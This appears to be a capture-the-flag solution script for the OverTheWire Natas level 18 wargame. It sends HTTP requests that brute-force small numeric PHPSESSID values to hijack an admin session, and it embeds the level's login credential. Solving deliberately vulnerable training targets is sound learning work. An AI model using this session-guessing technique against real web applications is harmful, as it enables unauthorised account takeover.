#!/usr/bin/env python
import requests

auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
s = requests.Session()

for i in range(640):
    s.cookies.set('PHPSESSID', '%d' % i)
    r = s.get('http://natas18.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=admin', auth=auth)
    if not "regular user" in r.text:
        print r.text
        break
